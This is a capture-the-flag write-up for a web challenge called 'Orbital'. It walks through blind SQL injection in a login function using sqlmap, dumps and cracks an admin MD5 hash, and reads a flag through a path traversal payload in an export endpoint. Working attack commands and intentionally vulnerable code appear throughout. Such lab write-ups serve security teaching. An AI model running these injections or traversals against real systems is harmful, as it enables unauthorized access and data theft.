# Orbital (easy)
In this challange we continue exploiting SQL injection.

Upon loading the website we are greeted with a login prompt.
Nothing much to go off of, so I checked the provided backend code.

I checked the login mechanism and saw that it still had SQL injection in the `database.py` file:
```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```

However this time the password isn't part of the query, therefore the check can't be directly bypassed.
But this is still an SQL injection nevertheless.

Since no results are reflected back apart from the success/failure of the authentication, this will be a blind sql injection attack.

To automate the process I have used the `sqlmap` command (`community/sqlmap` package on archlinux).
Since this was a POST request with JSON data, I have decided it would be easiest to provide a *request file* to sqlmap.

In this file I specify all request headers, the target and the body.
We can use the `*` character to indicate where we want the injection to happen, this is the `username` field for us.

```shell
➜  web_orbital sqlmap -r $(pwd)/req.txt --ignore-code 401
```

This command will test for SQL injection, we ignore code 401, since that is most likely a result of some input the server couldn't handle.

Now we can use the sqlmap options, such as `--tables` and `--dump` to list all the tables, and then dump a given table

```shell
➜  web_orbital sqlmap -r $(pwd)/req.txt --ignore-code 401 -T users --dump
```

This command will list everything it can find in the users table.
Here we will find the username and password of the admin user
```
[22:35:46] [INFO] retrieved: '1'
[22:35:46] [INFO] retrieved: '1692b753c031f2905b89e7258dbc49bb'
[22:35:46] [INFO] retrieved: 'admin'
[22:35:46] [INFO] recognized possible password hashes in column 'password'
```

However we see that the password seems like a hash.
And indeed checking the source code in `util.py` confirms this theory.

```python
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False
```

However I threw this hash into a reverse md5 lookup and got the result: *ichliebedich*

Now we can use these credentails to log in as admin, however we still need to get the flag.

The flag this time lives in a file in `/signal_sleuth_firmware`.
My attention immediately jumped to the export feature for recent communications.
Upon checking the source code for this section, and arbitrary file read bug is identified:

```python
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

When sending this request we can simply provide `../../../../../signal_sleuth_firmware` and then we get the flag in base64 encoded format.
